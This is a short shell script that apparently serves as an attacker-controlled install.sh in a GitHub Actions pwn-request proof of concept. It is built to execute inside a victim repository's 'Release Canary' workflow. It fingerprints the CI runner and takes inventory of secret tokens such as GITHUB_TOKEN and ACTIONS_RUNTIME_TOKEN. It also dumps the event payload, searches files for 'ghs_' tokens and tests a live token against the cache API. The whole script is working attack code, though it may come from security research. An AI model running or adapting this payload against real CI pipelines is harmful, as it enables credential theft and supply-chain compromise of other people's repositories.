#!/bin/sh
# attacker-controlled install.sh executed by Release Canary through workflow_run head_sha
echo "===PWNED-lazyhacker6-RCE-OK==="
echo "job=${GITHUB_JOB:-} event=${GITHUB_EVENT_NAME:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} repo=${GITHUB_REPOSITORY:-} actor=${GITHUB_ACTOR:-}"
id 2>/dev/null || true
hostname 2>/dev/null || true
uname -a 2>/dev/null || true
echo "--- creds inventory ---"
for v in GITHUB_TOKEN GH_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_CACHE_URL ACTIONS_RESULTS_URL ACTIONS_RUNTIME_URL GITHUB_GRAPHQL_URL; do
  eval "x=\${$v:-}"
  if [ -n "$x" ]; then echo "ENV $v present len=${#x}"; else echo "ENV $v absent"; fi
done
echo "--- event payload head ---"
if [ -n "${GITHUB_EVENT_PATH:-}" ] && [ -f "$GITHUB_EVENT_PATH" ]; then
  head -c 1200 "$GITHUB_EVENT_PATH"; echo
fi
echo "--- search for ghs_ tokens in accessible files ---"
grep -rl --include='*' -e 'ghs_' "$HOME" "$GITHUB_WORKSPACE" 2>/dev/null | head -5 || true
echo "--- cache api probe (ACTIONS_RUNTIME_TOKEN liveness) ---"
if [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && [ -n "${ACTIONS_CACHE_URL:-}" ]; then
  curl -sS -o /tmp/cacheprobe.out -w "cache_http=%{http_code}\n" \
    -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
    -H "Accept: application/json;api-version=6.0-preview.1" \
    "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=lazyhacker6-probe&version=probe" || true
  head -c 400 /tmp/cacheprobe.out 2>/dev/null; echo
fi
echo "===PWNED-lazyhacker6-END==="
exit 1
